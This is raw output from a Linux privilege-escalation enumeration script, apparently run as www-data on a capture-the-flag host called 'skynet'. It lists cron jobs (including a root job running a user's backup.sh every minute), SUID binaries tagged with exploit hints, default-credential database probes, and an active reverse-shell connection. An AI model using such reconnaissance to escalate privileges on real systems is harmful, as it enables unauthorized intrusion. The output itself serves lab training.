-rwxr-xr-x 1 root root   662560 Aug 26  2019 /usr/sbin/apache2
-rwxr-xr-x 1 root root    26632 Jan 14  2016 /usr/sbin/atd
-rwxr-xr-x 1 root root    44472 Apr  5  2016 /usr/sbin/cron
-rwxr-xr-x 1 root root    79968 Aug 28  2019 /usr/sbin/dovecot
-rwxr-xr-x 1 root root 24966440 Jul 23  2019 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   247832 May 23  2019 /usr/sbin/nmbd
-rwxr-xr-x 1 root root   599328 Apr  5  2016 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root    71776 May 23  2019 /usr/sbin/smbd
-rwxr-xr-x 1 root root   791024 Mar  4  2019 /usr/sbin/sshd
-rwxr-xr-x 1 root root  1140056 May 23  2019 /usr/sbin/winbindd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs                                      
-rw-r--r-- 1 root root  776 Sep 17  2019 /etc/crontab                                                               

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Sep 17  2019 .
drwxr-xr-x 102 root root 4096 Nov 26  2020 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root  589 Jul 16  2014 mdadm
-rw-r--r--   1 root root  712 Dec 17  2018 php
-rw-r--r--   1 root root  191 Sep 17  2019 popularity-contest

/etc/cron.daily:
total 68
drwxr-xr-x   2 root root 4096 Sep 17  2019 .
drwxr-xr-x 102 root root 4096 Nov 26  2020 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root  539 Jun 11  2018 apache2
-rwxr-xr-x   1 root root  376 Mar 31  2016 apport
-rwxr-xr-x   1 root root 1474 Oct  9  2018 apt-compat
-rwxr-xr-x   1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x   1 root root 1597 Nov 26  2015 dpkg
-rwxr-xr-x   1 root root  372 May  5  2015 logrotate
-rwxr-xr-x   1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x   1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x   1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x   1 root root  249 Nov 12  2015 passwd
-rwxr-xr-x   1 root root 3449 Feb 26  2016 popularity-contest
-rwxr-xr-x   1 root root  383 Sep 24  2018 samba
-rwxr-xr-x   1 root root  330 Apr  7  2018 squirrelmail
-rwxr-xr-x   1 root root  214 Dec  7  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Sep 17  2019 .
drwxr-xr-x 102 root root 4096 Nov 26  2020 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Sep 17  2019 .
drwxr-xr-x 102 root root 4096 Nov 26  2020 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x   2 root root 4096 Sep 17  2019 .
drwxr-xr-x 102 root root 4096 Nov 26  2020 ..
-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   86 Apr 13  2016 fstrim
-rwxr-xr-x   1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x   1 root root  211 Dec  7  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/1 *   * * *   root    /home/milesdyson/backups/backup.sh

[+] Services
[i] Search for outdated versions                                                                                    
 [ + ]  acpid                                                                                                       
 [ + ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  bootmisc.sh
 [ - ]  checkfs.sh
 [ - ]  checkroot-bootclean.sh
 [ - ]  checkroot.sh
 [ + ]  console-setup
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  dovecot
 [ + ]  grub-common
 [ - ]  hostname.sh
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ + ]  iscsid
 [ + ]  keyboard-setup
 [ - ]  killprocs
 [ + ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ + ]  lxcfs
 [ - ]  lxd
 [ + ]  mdadm
 [ - ]  mdadm-waitidle
 [ - ]  mountall-bootclean.sh
 [ - ]  mountall.sh
 [ - ]  mountdevsubfs.sh
 [ - ]  mountkernfs.sh
 [ - ]  mountnfs-bootclean.sh
 [ - ]  mountnfs.sh
 [ + ]  mysql
 [ + ]  networking
 [ + ]  nmbd
 [ + ]  ondemand
 [ + ]  open-iscsi
 [ - ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  postfix
 [ + ]  procps
 [ + ]  rc.local
 [ + ]  resolvconf
 [ - ]  rsync
 [ + ]  rsyslog
 [ + ]  samba
 [ + ]  samba-ad-dc
 [ - ]  screen-cleanup
 [ - ]  sendsigs
 [ + ]  smbd
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ - ]  umountfs
 [ - ]  umountnfs.sh
 [ - ]  umountroot
 [ + ]  unattended-upgrades
 [ + ]  urandom
 [ - ]  uuidd
 [ + ]  winbind


===================================( Network Information )====================================
[+] Hostname, hosts and DNS                                                                                         
skynet                                                                                                              
127.0.0.1       localhost
127.0.1.1       skynet

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 10.0.0.2
search eu-west-1.compute.internal

[+] Content of /etc/inetd.conf
/etc/inetd.conf Not Found                                                                                           
                                                                                                                    
[+] Networks and neighbours
# symbolic names for networks, see networks(5) for more information                                                 
link-local 169.254.0.0
eth0      Link encap:Ethernet  HWaddr 02:65:c1:8c:88:4d  
          inet addr:10.10.250.32  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::65:c1ff:fe8c:884d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:273 errors:0 dropped:0 overruns:0 frame:0
          TX packets:401 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:157908 (157.9 KB)  TX bytes:54909 (54.9 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:244 errors:0 dropped:0 overruns:0 frame:0
          TX packets:244 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:19360 (19.3 KB)  TX bytes:19360 (19.3 KB)

10.10.0.1 dev eth0 lladdr 02:c8:85:b5:5a:aa REACHABLE
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.10.0.1       0.0.0.0         UG    0      0        0 eth0
10.10.0.0       0.0.0.0         255.255.0.0     U     0      0        0 eth0

[+] Iptables rules
iptables rules Not Found                                                                                            
                                                                                                                    
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports                                 
Active Internet connections (servers and established)                                                               
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      -               
tcp        0    178 10.10.250.32:59402      10.8.78.81:9999         ESTABLISHED 1607/sh         
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:25                  :::*                    LISTEN      -               
tcp6       0      0 :::445                  :::*                    LISTEN      -               
tcp6       0      0 :::139                  :::*                    LISTEN      -               
tcp6       0      0 :::110                  :::*                    LISTEN      -               
tcp6       0      0 :::143                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 10.10.250.32:80         10.8.78.81:45542        ESTABLISHED -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
udp        0      0 10.10.255.255:137       0.0.0.0:*                           -               
udp        0      0 10.10.250.32:137        0.0.0.0:*                           -               
udp        0      0 0.0.0.0:137             0.0.0.0:*                           -               
udp        0      0 10.10.255.255:138       0.0.0.0:*                           -               
udp        0      0 10.10.250.32:138        0.0.0.0:*                           -               
udp        0      0 0.0.0.0:138             0.0.0.0:*                           -               

[+] Can I sniff with tcpdump?
No                                                                                                                  
                                                                                                                    

====================================( Users Information )=====================================
[+] My user                                                                                                         
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups                                              
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                               

[+] Do I have PGP keys?
gpg Not Found                                                                                                       
                                                                                                                    
[+] Clipboard or highlighted text?
xsel and xclip Not Found                                                                                            
                                                                                                                    
[+] Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                
                                                                                                                    
[+] Checking /etc/doas.conf
/etc/doas.conf Not Found                                                                                            
                                                                                                                    
[+] Checking Pkexec policy
                                                                                                                    
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

[+] Don forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                                                                                          
[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                   
                                                                                                                    
[+] Superusers
root:x:0:0:root:/root:/bin/bash                                                                                     

[+] Users with console
milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash                                                               
root:x:0:0:root:/root:/bin/bash

[+] Login information
 10:05:37 up 11 min,  0 users,  load average: 0.09, 0.15, 0.11                                                      
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
reboot   system boot  4.8.0-58-generic Tue Sep 17 23:08 - 03:10 (2+04:01)
root     pts/0        192.168.1.147    Tue Sep 17 23:02 - crash  (00:06)
reboot   system boot  4.8.0-58-generic Tue Sep 17 23:01 - 03:10 (2+04:08)
root     pts/0        192.168.1.147    Tue Sep 17 17:35 - down   (05:25)
johnconn pts/0        192.168.1.147    Tue Sep 17 01:17 - 06:29  (05:12)
reboot   system boot  4.4.0-142-generi Tue Sep 17 01:16 - 23:01  (21:44)
johnconn tty1                          Tue Sep 17 01:00 - crash  (00:16)
reboot   system boot  4.4.0-142-generi Tue Sep 17 00:59 - 23:01  (22:01)

wtmp begins Tue Sep 17 00:59:57 2019

[+] All users
_apt                                                                                                                
backup
bin
daemon
dnsmasq
dovecot
dovenull
games
gnats
irc
list
lp
lxd
mail
man
messagebus
milesdyson
mysql
news
nobody
postfix
proxy
root
sshd
sync
sys
syslog
systemd-bus-proxy
systemd-network
systemd-resolve
systemd-timesync
uucp
uuidd
www-data

[+] Password policy
PASS_MAX_DAYS   99999                                                                                               
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512


===================================( Software Information )===================================
[+] MySQL version                                                                                                   
mysql  Ver 14.14 Distrib 5.7.27, for Linux (x86_64) using  EditLine wrapper                                         

[+] MySQL connection using default root/root ........... No
[+] MySQL connection using root/toor ................... No                                                         
[+] MySQL connection using root/NOPASS ................. No                                                         
[+] Looking for mysql credentials and exec                                                                          
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                     
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

[+] PostgreSQL version and pgadmin credentials
 Not Found                                                                                                          
                                                                                                                    
[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No                                            
[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                            
[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                            
                                                                                                                    
[+] Apache server info
Version: Server version: Apache/2.4.18 (Ubuntu)                                                                     
Server built:   2019-08-26T13:43:29

[+] Looking for PHPCookies
 Not Found                                                                                                          
                                                                                                                    
[+] Looking for Wordpress wp-config.php files
wp-config.php Not Found                                                                                             
                                                                                                                    
[+] Looking for Tomcat users file
tomcat-users.xml Not Found                                                                                          
                                                                                                                    
[+] Mongo information
 Not Found                                                                                                          
                                                                                                                    
[+] Looking for supervisord configuration file
supervisord.conf Not Found                                                                                          
                                                                                                                    
[+] Looking for cesi configuration file
cesi.conf Not Found                                                                                                 
                                                                                                                    
[+] Looking for Rsyncd config file
/usr/share/doc/rsync/examples/rsyncd.conf                                                                           
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz

[+] Looking for Hostapd config file
hostapd.conf Not Found                                                                                              
                                                                                                                    
[+] Looking for wifi conns file
 Not Found                                                                                                          
                                                                                                                    
[+] Looking for Anaconda-ks config files
anaconda-ks.cfg Not Found                                                                                           
                                                                                                                    
[+] Looking for .vnc directories and their passwd files
.vnc Not Found                                                                                                      
                                                                                                                    
[+] Looking for ldap directories and their hashes
/etc/ldap                                                                                                           
The password hash is from the {SSHA} to 'structural'

[+] Looking for .ovpn files and credentials
.ovpn Not Found                                                                                                     
                                                                                                                    
[+] Looking for ssl/ssh files
Port 22                                                                                                             
PermitRootLogin yes
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes

Looking inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

[+] Looking for unexpected auth lines in /etc/pam.d/sshd
No                                                                                                                  
                                                                                                                    
[+] Looking for Cloud credentials (AWS, Azure, GC)
                                                                                                                    
[+] NFS exports?
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe              
/etc/exports Not Found                                                                                              
                                                                                                                    
[+] Looking for kerberos conf files and tickets
[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                               
krb5.conf Not Found                                                                                                 
tickets kerberos Not Found                                                                                          
klist Not Found                                                                                                     
                                                                                                                    
[+] Looking for Kibana yaml
kibana.yml Not Found                                                                                                
                                                                                                                    
[+] Looking for logstash files
 Not Found                                                                                                          
                                                                                                                    
[+] Looking for elasticsearch files
 Not Found                                                                                                          
                                                                                                                    
[+] Looking for Vault-ssh files
vault-ssh-helper.hcl Not Found                                                                                      
                                                                                                                    
[+] Looking for AD cached hahses
/var/lib/samba/private/secrets.tdb                                                                                  

[+] Looking for screen sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                 
No Sockets found in /var/run/screen/S-www-data.                                                                     

[+] Looking for tmux sessions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                 
tmux Not Found                                                                                                      
                                                                                                                    
[+] Looking for Couchdb directory
                                                                                                                    
[+] Looking for redis.conf
                                                                                                                    
[+] Looking for dovecot files
dovecot credentials Not Found                                                                                       
                                                                                                                    
[+] Looking for mosquitto.conf
                                                                                                                    

====================================( Interesting Files )=====================================
[+] SUID                                                                                                            
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                
/sbin/mount.cifs                                                                                                    
/bin/mount              --->    Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
/bin/fusermount
/bin/umount             --->    BSD/Linux[1996-08-13]
/bin/ping
/bin/su
/bin/ping6
/usr/bin/passwd         --->    Apple_Mac_OSX/Solaris/SPARC_8/9/Sun_Solaris_2.5.1_PAM
/usr/bin/sudo           --->    /sudo$
/usr/bin/newgrp         --->    HP-UX_10.20
/usr/bin/gpasswd
/usr/bin/pkexec         --->    rhel_6/Also_check_groups_privileges_and_pkexec_policy
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/chfn           --->    SuSE_9.3/10
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands                
/sbin/unix_chkpwd                                                                                                   
/sbin/pam_extrausers_chkpwd
/usr/sbin/postdrop
/usr/sbin/postqueue
/usr/bin/mlocate
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/chage
/usr/bin/screen         --->    GNU_Screen_4.5.0
/usr/bin/expiry
/usr/bin/at
/usr/bin/ssh-agent
/usr/bin/wall
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/snapd/snap-confine

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                        
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep                                                   
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr = cap_net_raw+ep

[+] .sh files in path
/usr/bin/gettext.sh                                                                                                 

[+] Files (scripts) in /etc/profile.d/
total 24                                                                                                            
drwxr-xr-x   2 root root 4096 Sep 17  2019 .
drwxr-xr-x 102 root root 4096 Nov 26  2020 ..
-rw-r--r--   1 root root 1557 Apr 14  2016 Z97-byobu.sh
-rw-r--r--   1 root root  825 Jan 29  2019 apps-bin-path.sh
-rw-r--r--   1 root root  663 May 18  2016 bash_completion.sh
-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

[+] Hashes inside passwd file? ........... No
[+] Can I read shadow files? ........... No                                                                         
[+] Can I read root folder? ........... No                                                                          
                                                                                                                    
[+] Looking for root files in home dirs (limit 20)
/home                                                                                                               
/home/milesdyson/.bash_history
/home/milesdyson/backups
/home/milesdyson/backups/backup.sh
/home/milesdyson/backups/backup.tgz
/home/milesdyson/share/Improving Deep Neural Networks.pdf
/home/milesdyson/share/Natural Language Processing-Building Sequence Models.pdf
/home/milesdyson/share/Convolutional Neural Networks-CNN.pdf
/home/milesdyson/share/notes
/home/milesdyson/share/notes/3.01 Search.md
/home/milesdyson/share/notes/4.01 Agent-Based Models.md
/home/milesdyson/share/notes/2.08 In Practice.md
/home/milesdyson/share/notes/0.00 Cover.md
/home/milesdyson/share/notes/1.02 Linear Algebra.md
/home/milesdyson/share/notes/important.txt
/home/milesdyson/share/notes/6.01 pandas.md
/home/milesdyson/share/notes/3.00 Artificial Intelligence.md
/home/milesdyson/share/notes/2.01 Overview.md
/home/milesdyson/share/notes/3.02 Planning.md
/home/milesdyson/share/notes/1.04 Probability.md

[+] Looking for root files in folders owned by me
                                                                                                                    
[+] Readable files belonging to root and readable by me but not world readable
                                                                                                                    
[+] Files inside /home/www-data (limit 20)
                                                                                                                    
[+] Files inside others home (limit 20)
/home/milesdyson/.bash_logout                                                                                       
/home/milesdyson/backups/backup.sh
/home/milesdyson/backups/backup.tgz
/home/milesdyson/share/Improving Deep Neural Networks.pdf
/home/milesdyson/share/Natural Language Processing-Building Sequence Models.pdf
/home/milesdyson/share/Convolutional Neural Networks-CNN.pdf
/home/milesdyson/share/notes/3.01 Search.md
/home/milesdyson/share/notes/4.01 Agent-Based Models.md
/home/milesdyson/share/notes/2.08 In Practice.md
/home/milesdyson/share/notes/0.00 Cover.md
/home/milesdyson/share/notes/1.02 Linear Algebra.md
/home/milesdyson/share/notes/important.txt
/home/milesdyson/share/notes/6.01 pandas.md
/home/milesdyson/share/notes/3.00 Artificial Intelligence.md
/home/milesdyson/share/notes/2.01 Overview.md
/home/milesdyson/share/notes/3.02 Planning.md
/home/milesdyson/share/notes/1.04 Probability.md
/home/milesdyson/share/notes/2.06 Natural Language Processing.md
/home/milesdyson/share/notes/2.00 Machine Learning.md
/home/milesdyson/share/notes/1.03 Calculus.md

[+] Looking for installed mail applications
dovecot                                                                                                             
postfix
squirrelmail
maildirmake.dovecot
dovecot
postfix
postfix-add-filter
postfix-add-policy
sendmail
squirrelmail-configure

[+] Mails (limit 50)
/var/mail/milesdyson                                                                                                
/var/mail/root
/var/spool/mail/milesdyson
/var/spool/mail/root

[+] Backup files?
-rw-r--r-- 1 root root 128 Sep 17  2019 /var/lib/sgml-base/supercatalog.old                                         
-rw-r--r-- 1 root root 673 Sep 17  2019 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 Sep 17  2019 /etc/xml/catalog.old
-rwxr-xr-x 1 root root 74 Sep 17  2019 /home/milesdyson/backups/backup.sh
-rw-r--r-- 1 root root 4679680 Jun 30 10:06 /home/milesdyson/backups/backup.tgz
-rwxr-xr-x 1 root root 10504 Mar 14  2016 /usr/bin/tdbbackup.tdbtools

[+] Looking for tables inside readable .db/.sqlite files (limit 100)
 -> Extracting tables from /var/www/html/45kra24zxs28v3yd/administrator/templates/default/images/template/Thumbs.db (limit 20)                                                                                                          
 -> Extracting tables from /var/www/html/45kra24zxs28v3yd/administrator/templates/default/images/template/datagrid/Thumbs.db (limit 20)
 -> Extracting tables from /etc/aliases.db (limit 20)                                                               
                                                                                                                    
[+] Web files?(output limit)
/var/www/:                                                                                                          
total 12K
drwxr-xr-x  3 root     root     4.0K Sep 17  2019 .
drwxr-xr-x 14 root     root     4.0K Sep 17  2019 ..
drwxr-xr-x  8 www-data www-data 4.0K Nov 26  2020 html

/var/www/html:
total 68K
drwxr-xr-x 8 www-data www-data 4.0K Nov 26  2020 .
drwxr-xr-x 3 root     root     4.0K Sep 17  2019 ..

[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                             
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                 
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc                                                          
-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
-rw-r--r-- 1 root root 2188 Aug 31  2015 /etc/bash.bashrc
-rw-r--r-- 1 milesdyson milesdyson 3771 Sep 17  2019 /home/milesdyson/.bashrc
-rw-r--r-- 1 milesdyson milesdyson 655 Sep 17  2019 /home/milesdyson/.profile
-rw-r--r-- 1 root root 3161 Apr 14  2016 /usr/share/byobu/profiles/bashrc
-rw-r--r-- 1 root root 1865 Jul  2  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
-rw-r--r-- 1 root root 870 Jul  2  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
-rw-r--r-- 1 root root 3106 Oct 22  2015 /usr/share/base-files/dot.bashrc

[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
   130545      4 -rw-r--r--   1 root     root          220 Aug 31  2015 /etc/skel/.bash_logout                      
   130052      0 -rw-------   1 root     root            0 Feb 26  2019 /etc/.pwd.lock
   130204      4 -rw-r--r--   1 root     root         1430 Sep 17  2019 /etc/apparmor.d/cache/.features
   411831      4 -rw-r--r--   1 milesdyson milesdyson      220 Sep 17  2019 /home/milesdyson/.bash_logout
     1612      4 -rw-r--r--   1 root       root           1319 Sep 17  2019 /var/lib/apparmor/profiles/.apparmor.md5sums
      412      0 -rw-r--r--   1 root       root              0 Jun 30 09:54 /run/network/.ifstate.lock
   143055      4 -rw-r--r--   1 root       root             14 Mar 26  2009 /usr/share/squirrelmail/include/.htaccess
   143035      4 -rw-r--r--   1 root       root             14 Mar 26  2009 /usr/share/squirrelmail/po/.htaccess
   143075      4 -rw-r--r--   1 root       root             14 Mar 26  2009 /usr/share/squirrelmail/class/.htaccess
   142991      4 -rw-r--r--   1 root       root             14 Mar 26  2009 /usr/share/squirrelmail/locale/.htaccess
   415621      4 -rw-r--r--   1 root       root             14 Feb  5  2002 /usr/share/squirrelmail/plugins/squirrelspell/modules/.htaccess
   143047      4 -rw-r--r--   1 root       root             14 Mar 26  2009 /usr/share/squirrelmail/help/.htaccess
   142979      4 -rw-r--r--   1 root       root             14 Mar 26  2009 /usr/share/squirrelmail/functions/.htaccess
   522449      0 -rw-r--r--   1 root       root              0 Feb 19  2019 /usr/share/php/.lock
   522433      0 -rw-r--r--   1 root       root              0 Feb 19  2019 /usr/share/php/.depdblock
   286575    188 -rw-r--r--   1 root       root         190984 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/.config.old
   286573     16 -rw-r--r--   1 root       root          12506 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/kernel/.bounds.s.cmd
   286626    188 -rw-r--r--   1 root       root         190860 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/.config
   286569      4 -rw-r--r--   1 root       root           2391 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.conmakehash.cmd
   286568      4 -rw-r--r--   1 root       root           2380 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.kallsyms.cmd
   286511      4 -rw-r--r--   1 root       root           3239 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/selinux/genheaders/.genheaders.cmd
   286513      4 -rw-r--r--   1 root       root           2839 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/selinux/mdp/.mdp.cmd
   286553      4 -rw-r--r--   1 root       root           3387 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.recordmcount.cmd
   286525      4 -rw-r--r--   1 root       root            110 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/kconfig/.conf.cmd
   286528      8 -rw-r--r--   1 root       root           4917 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/kconfig/.zconf.tab.o.cmd
   286530      4 -rw-r--r--   1 root       root           3755 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/kconfig/.conf.o.cmd
   286535      4 -rw-r--r--   1 root       root           3972 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.insert-sys-cert.cmd
   286519      8 -rw-r--r--   1 root       root           4268 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/basic/.fixdep.cmd
   286520      4 -rw-r--r--   1 root       root           1193 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/basic/.bin2c.cmd
   286534      4 -rw-r--r--   1 root       root           3568 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.sortextable.cmd
   286567      8 -rw-r--r--   1 root       root           5133 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.sign-file.cmd
   286545      8 -rw-r--r--   1 root       root           4451 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.sumversion.o.cmd
   286538      4 -rw-r--r--   1 root       root           2537 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.mk_elfconfig.cmd
   286540      4 -rw-r--r--   1 root       root            129 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.modpost.cmd
   286551      4 -rw-r--r--   1 root       root           3485 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.file2alias.o.cmd
   286544      4 -rw-r--r--   1 root       root            104 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.elfconfig.h.cmd
   286541      4 -rw-r--r--   1 root       root           2425 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.empty.o.cmd
   286552      8 -rw-r--r--   1 root       root           4622 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.modpost.o.cmd
   286547      8 -rw-r--r--   1 root       root           5327 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/mod/.devicetable-offsets.s.cmd
   286557      4 -rw-r--r--   1 root       root           2481 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/genksyms/.parse.tab.o.cmd
   286563      4 -rw-r--r--   1 root       root           3347 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/genksyms/.lex.lex.o.cmd
   286558      4 -rw-r--r--   1 root       root           2719 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/genksyms/.genksyms.o.cmd
   286559      4 -rw-r--r--   1 root       root            153 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/genksyms/.genksyms.cmd
   286515      8 -rw-r--r--   1 root       root           4495 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.extract-cert.cmd
   286516      4 -rw-r--r--   1 root       root           3253 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/scripts/.asn1_compiler.cmd
   286576     52 -rw-r--r--   1 root       root          53148 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/kernel/.asm-offsets.s.cmd
   286580      4 -rw-r--r--   1 root       root           3621 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.purgatory.o.cmd
   286583      4 -rw-r--r--   1 root       root            360 Aug 27  2019 /usr/src/linux-headers-4.4.0-161-generic/arch/x86/purgatory/.purgatory.ro.cmd
